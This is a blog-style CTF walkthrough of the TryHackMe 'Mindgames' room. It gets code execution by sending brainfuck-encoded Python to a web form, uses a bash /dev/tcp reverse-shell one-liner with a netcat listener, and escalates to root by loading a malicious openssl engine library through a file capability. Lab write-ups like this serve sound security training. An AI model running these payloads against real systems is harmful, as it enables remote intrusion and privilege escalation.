---
author:
  name: "papadope"
date: 2020-12-01
linktitle: Mindgames
type:
- post
title: Mindgames
weight: 10
series:
- Tryhackme
---

![Room Image](/mindgames/room.png)

## Deploy

First of all, let’s deploy our machine. So click on the green deploy button if you haven’t done it already. Afterwards, to access the machine, you need to be inside TryHackMe network. So, get connected to THM VPN. We are not going to talk here about how can you connect to the VPN but there are awesome guides out there that can help you manage the frustration.

---

## Enumeration

![nmap](/mindgames/nmap.png)

I started a simple nmap scan just for the first 1000 ports. You can see that there is a HTTP port open. Let's visit it.

![http](/mindgames/http.png)

What I checked in that page before doing anything else : 

1. Source Code 
2. Networking / Requests / Responses
3. Links / Buttons / Tags

* Nothing there at least for now, so I continued my enumeration proccess.

* The thing here is that I already know what language that weird code is and it's called **brainfuck**. If you don't know what that language is simply *copy-paste* a small part of the code and google search it.

### Gobuster

Go buster here had nothing for as. Probably there is no hidded directory as I tried more than one lists.

That was the only result I found with the lists I tried.

![gobuster](/mindgames/gobust.png)

So I went back to the ``http`` we found earlier.

---

## HTTP

I copied the brainfuck code from there to [this](https://www.dcode.fr/brainfuck-language) site.

The thing we realise after doing that is that the **brainfuck** code is actually *python code*.

![decoded](/mindgames/decoded.png)

I understood that in the **Try before you buy** section you can paste a **brainfuck** code and it's going to be executed. In python. We can leverage that to spawn a Reverse Shell.

![trybub](/mindgames/trybub.png)

---

### Getting a reverse shell

I was searching for ways to execute python inside there.

I used this python code :

```

import os

os.system('bash -c "bash -i >& /dev/tcp/0.0.0.0/8888 0>&1"')

```

- Remember to change the IP on your TryHackMe VPN first.
- Remember to check that your listener is using the same port.

Before executing that code you need to get a netcat listener stand by waiting for the incoming connection.

```

nc -lvnp 8888

```

I found out that the only thing you need to do to get that Reverse Shell to work is to translate the **Python code** to **brainfuck** code. I achived that by using [this](https://copy.sh/brainfuck/text.html) site. If you are already using something else for that job, feel free to use it.

So get that python code and translate it to **brainfuck** as I am doing here :

```

+[----->+++<]>++.++++.+++.-.+++.++.[---->+<]>+++.+++++[->+++<]>.++++.>++++++++++..-[------->+<]>.++++.+[++>---<]>.[--->++<]>-.++++++.------.+.+++[->+++<]>.++++++++.+++[++>---<]>.-.-[--->+<]>.-.--[--->+<]>--.-----------.--[--->+<]>--.--[-->+++<]>.-[--->+<]>-.[--->+<]>-.++.-[->+++<]>-.-.--[--->+<]>--.-----------.--[--->+<]>--.--[-->+++<]>.[--->+++++++<]>.[--->+<]>---.-[->++<]>.--[--->++<]>--.------.[-->+++<]>-.[--->+<]>-.+.[--->+<]>-.[++>---<]>--.-[--->++<]>.++[->+++<]>+.+++++++++++++.[->+++++<]>-.+.--.++.--.++.--.++.-.+++++++++....[-->+<]>++++.[-->+++<]>.+[----->+<]>+.--[--->++<]>--.+++++++++++.++[--->++<]>.+++++.++.

```

- Notice that this code is not going to work for you. You need to set it up for your VPN IP and the port you want first.

And we got it!

![trybub](/mindgames/shell.png)


---

## Root

I prefer to do things manually. Sometimes, when you need to practice your skills, it's the best way to remember some basic commands on basic enumeration.

So for the user **mindgames** I started the enumeration process checking for *suid*, *cronjobs*, *passwords*, *bash-history*, *processes*, *sudo*, *capabilities*, etc.

The first thing I notice was that there where some interesting caps I could exploit.

Command : 

``getcap / -r 2>/dev/null``

Result : 

![caps](/mindgames/caps.png)

After running **Linpeas.sh** I verified that I could actually proceed with that. I visited the most useful website about binaries and that is [GTFObins](https://gtfobins.github.io/gtfobins/).

I saw that you can actually build a malicious library and execute arbitary code, in our case we want a shell. After googling how I could create my own engine I found out [this](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/) site. Simple guide on how to create an engine with openssl. I opened an editor inside my machine and wrote a simple c program to get a shell when it executes.

![c](/mindgames/c.png)

I compilled it and made it shared after the compile was ready.

``gcc -fPIC -o test.o -c test.c``

``gcc -shared -o test.so -lcrypto test.o``

Started a python server to get it inside the **/tmp** directory on the target server.

![tmp](/mindgames/tmp.png)

---

I used the way GTFObins had already for me. I executed the command :

``openssl req -engine ./test.so``

- My file name is test, you can name it however you want.
- I found another way to do that later, in my opinion you should try to find out more than one ways of doing things.

![root](/mindgames/root.png)

Thank you very much for reading.